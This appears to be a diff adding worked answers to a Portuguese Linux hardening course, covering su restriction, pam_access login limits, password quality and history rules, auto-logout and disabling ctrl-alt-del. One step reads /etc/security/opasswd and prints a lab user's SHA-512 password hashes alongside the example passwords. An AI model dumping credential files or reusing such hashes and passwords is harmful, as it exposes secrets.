+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ su -
+Password:
+su: Permission denied</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ logout</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Agora, vamos testar com um membro do grupo, como o usuário <code>docbrown</code> criado anteriormente.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># su - docbrown</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+docbrown</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ su -
+Password:</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># whoami
+root</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -8037,15 +10264,125 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Habilite o módulo <code>pam_access</code> para logins <code>ssh</code>, editando o arquivo <code>/etc/pam.d/sshd</code>.</p>
+<div class="paragraph">
+<p>Basta descomentar a linha <code>account   required   pam_access.so</code>, como mostrado a seguir.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/pam.d/sshd
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^account *required *pam_access.so' /etc/pam.d/sshd
+account  required     pam_access.so</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Habilite o módulo <code>pam_access</code> para logins em console texto, editando o arquivo <code>/etc/pam.d/login</code>.</p>
+<div class="paragraph">
+<p>Basta descomentar a linha <code>account   required   pam_access.so</code>, como mostrado a seguir.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/pam.d/login
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep '^account *required *pam_access.so' /etc/pam.d/login
+account  required       pam_access.so</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Edite o arquivo <code>/etc/security/access.conf</code> e restrinja o acesso à console local e logins <code>ssh</code> apenas para membros do grupo <code>wheel</code> que efetuem login local ou logins remotos oriundos da rede 172.16.G.0/24, especificamente. Teste sua configuração.</p>
+<div class="paragraph">
+<p>Vamos editar o arquivo <code>/etc/security/access.conf</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/security/access.conf
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep -v '^#' /etc/security/access.conf
++ : wheel : LOCAL 172.16.1.0/24
+- : ALL : ALL</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Vamos monitorar o arquivo <code>/var/log/auth.log</code>, e testar alguns cenários. Primeiro, vamos tentar um login via console texto usando o usuário <code>aluno</code>. Temos os seguintes eventos registrados:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Sep  8 11:16:07 LinServer-A login[418]: pam_access(login:account): access denied for user `aluno' from `tty1'
+Sep  8 11:16:07 LinServer-A login[418]: Permission denied</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Ao tentar login na console texto com o usuário <code>docbrown</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Sep  8 11:17:18 LinServer-A login[3787]: pam_unix(login:session): session opened for user docbrown by LOGIN(uid=0)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Vamos testar um login remoto via <code>ssh</code> usando o usuário <code>aluno</code> a partir da máquina <em>FWGW1-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Sep  8 11:18:34 LinServer-A sshd[3818]: pam_access(sshd:account): access denied for user `aluno' from `172.16.1.1'
+Sep  8 11:18:34 LinServer-A sshd[3818]: fatal: Access denied for user aluno by PAM account configuration [preauth]</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>A configuração sequer permite que tentemos digitar a senha do usuário&#8201;&#8212;&#8201;o bloqueio é feito antes disso. A seguir, vamos testar um login remoto via <code>ssh</code> usando o usuário <code>docbrown</code>, porém a partir da máquina <em>WinClient-G</em>, que está na faixa de IP incorreta:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Sep  8 11:23:10 LinServer-A sshd[3891]: pam_access(sshd:account): access denied for user `docbrown' from `10.1.1.10'
+Sep  8 11:23:10 LinServer-A sshd[3889]: error: PAM: User account has expired for docbrown from 10.1.1.10</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Finalmente, vamos testar o cenário de login remoto via <code>ssh</code> usando o usuário <code>docbrown</code> a partir da máquina <em>FWGW1-G</em>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Sep  8 11:32:18 LinServer-A sshd[4027]: Accepted keyboard-interactive/pam for docbrown from 172.16.1.1 port 34663 ssh2
+Sep  8 11:32:18 LinServer-A sshd[4027]: pam_unix(sshd:session): session opened for user docbrown by (uid=0)</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Note, portanto, que foram autorizados os logins apenas nos casos em que:</p>
+</div>
+<div class="openblock">
+<div class="content">
+<div class="olist loweralpha">
+<ol class="loweralpha" type="a">
+<li>
+<p>O usuário era membro do grupo <code>wheel</code> <strong>e</strong> o login era feito localmente, ou</p>
+</li>
+<li>
+<p>O usuário era membro do grupo <code>wheel</code> <strong>e</strong> o login era feito remotamente a partir da faixa de IPs autorizada.</p>
+</li>
+</ol>
+</div>
+</div>
+</div>
 </li>
 <li>
 <p>Reverta as configurações realizadas nesta atividade.</p>
+<div class="paragraph">
+<p>Basta comentar as linhas inseridas nos passos (1), (2) e (3) desta atividade.</p>
+</div>
 </li>
 </ol>
 </div>
@@ -8082,9 +10419,141 @@ root</pre>
 </div>
 </div>
 </div>
+<div class="paragraph">
+<p>Primeiro, vamos instalar os pacotes solicitados:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># apt-get install libpam-modules libpam-pwquality</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Para impor os requisitos de qualidade de senha, basta editar o arquivo <code>/etc/security/pwquality.conf</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/security/pwquality.conf
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep -v '^#' /etc/security/pwquality.conf
+minlen = 10
+dcredit = -1
+ucredit = -1
+ocredit = -1</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Para impor os requisitos de não-repetição de senha, é necessário incluir uma linha para o módulo <code>pam_pwhistory.so</code> no arquivo <code>/etc/pam.d/common-password</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># nano /etc/pam.d/common-password
+(...)</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep 'pam_pwhistory.so' /etc/pam.d/common-password
+password        requisite                       pam_pwhistory.so retry=3 remember=6 use_authtok</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Especificamente, essa linha pode ficar após a checagem de qualidade de senha (via módulo <code>pam_pwquality.so</code>) e antes dos módulos padrão do sistema, como mostrado a seguir:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># grep -v '^#' /etc/pam.d/common-password | sed '/^$/d'
+password        requisite                       pam_pwquality.so retry=3
+password        requisite                       pam_pwhistory.so retry=3 remember=6 use_authtok
+password        [success=1 default=ignore]      pam_unix.so obscure use_authtok try_first_pass sha512
+password        requisite                       pam_deny.so
+password        required                        pam_permit.so</pre>
+</div>
+</div>
 </li>
 <li>
 <p>Teste suas configurações. Tente alterar a senha de um usuário não-privilegiado sem respeitar os requisitos mínimos de qualidade estabelecidos. Depois, tente reutilizar senhas e verifique o comportamento do sistema.</p>
+<div class="paragraph">
+<p>Vamos tentar alterar a senha do usuário <code>mcfly</code>. Progressivamente, vamos tentar a senha <code>teste</code>, depois <code>teste1</code> e finalmente <code>Teste1</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+mcfly</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ passwd
+Changing password for mcfly.
+(current) UNIX password:
+New password:
+BAD PASSWORD: The password contains less than 1 digits
+New password:
+BAD PASSWORD: The password contains less than 1 uppercase letters
+New password:
+BAD PASSWORD: The password contains less than 1 non-alphanumeric characters
+passwd: Have exhausted maximum number of retries for service
+passwd: password unchanged</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Veja que o sistema reclamou nas três ocasiões, pois é necessário que a senha possua mais do que 10 caracteres, e pelo menos um caractere numérico, letra maiúscula e caractere especial. Finalmente, decidimos alterar a senha do usuário <code>mcfly</code> para <code>Testes123!</code>.</p>
+</div>
+<div class="paragraph">
+<p>Agora, vamos tentar alterar a senha para o mesmo valor, e depois para <code>Testes234!</code> e <code>Testes345!</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ passwd
+Changing password for mcfly.
+(current) UNIX password:
+New password:
+BAD PASSWORD: The password is the same as the old one
+New password:
+BAD PASSWORD: The password is too similar to the old one
+New password:
+BAD PASSWORD: The password is too similar to the old one
+passwd: Have exhausted maximum number of retries for service
+passwd: password unchanged</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Nos três casos, o sistema detectou que a senha ou era idêntica à original, ou que era muito parecida. Finalmente, decidimos alterar a senha do usuário <code>mcfly</code> para <code>Dufus!456</code>.</p>
+</div>
+<div class="paragraph">
+<p>Vamos agora tentar reutilizar a senha antiga, <code>Testes123!</code>:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ passwd
+Changing password for mcfly.
+(current) UNIX password:
+New password:
+Retype new password:
+Password has been already used. Choose another.
+passwd: Authentication token manipulation error
+passwd: password unchanged</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>O sistema reporta que a senha já havia sido utilizada anteriormente. Onde esse registro fica mantido? No arquivo <code>/etc/security/opasswd</code>, como visto abaixo:</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># whoami
+root</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># cat /etc/security/opasswd
+mcfly:1001:3:$6$hJ8atdxg$cHkLXvRIRs2VDqeJQl2iNSlteeGEXdMqwI2odVx2n3XOgGGjLKfhmf/Bx8dzkdDpVafT5z0LZNXPfwgcOvemD1,$6$yCYO8kaZ$XKKQwStnM3P6EnNMst9BX1r2aj5lHNVM2dSXAIl6XoW.9ypTch/q4eGhBI6w9JEwkAtnpN7xQCFxqp54pWKkS0,$6$EbARjVI9$u.mPGxn.ibveMlSGSumiiyO/6UTYS1d0YAN4mgSZ7JAv.Jj0XP7X8XRDvX7XuB1PEGWt5C0w4ZwuQXQmoKlpW1</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -8098,6 +10567,30 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Edite o arquivo <code>/etc/profile</code> e ative o logoff automático de usuários para dez segundos. Teste sua configuração.</p>
+<div class="literalblock">
+<div class="content">
+<pre># tail -n1 /etc/profile
+export TMOUT=10</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># su - aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ whoami
+aluno</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>$ timed out waiting for input: auto-logout
+# whoami
+root</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -8108,6 +10601,29 @@ root</pre>
 <ol class="arabic">
 <li>
 <p>Para evitar que o servidor Linux seja reiniciado quando o seu teclado for confundido com o de um servidor Windows, desabilite a combinação de teclas CTRL + ALT + DEL.</p>
+<div class="literalblock">
+<div class="content">
+<pre># ls -ld /lib/systemd/system/ctrl-alt-del.target
+lrwxrwxrwx 1 root root 13 Apr  8  2017 /lib/systemd/system/ctrl-alt-del.target -&gt; reboot.target</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre># systemctl mask ctrl-alt-del.target
+Created symlink from /etc/systemd/system/ctrl-alt-del.target to /dev/null.</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>root@LinServer-A:~# systemctl daemon-reload</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>root@LinServer-A:~# ls -ld /etc/systemd/system/ctrl-alt-del.target
+lrwxrwxrwx 1 root root 9 Sep  8 19:17 /etc/systemd/system/ctrl-alt-del.target -&gt; /dev/null</pre>
+</div>
+</div>
 </li>
 </ol>
 </div>
@@ -8118,7 +10634,7 @@ root</pre>
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2018-10-10 17:04:48 -03
+Last updated 2019-04-08 02:24:02 -03
 </div>
 </div>
 </body>
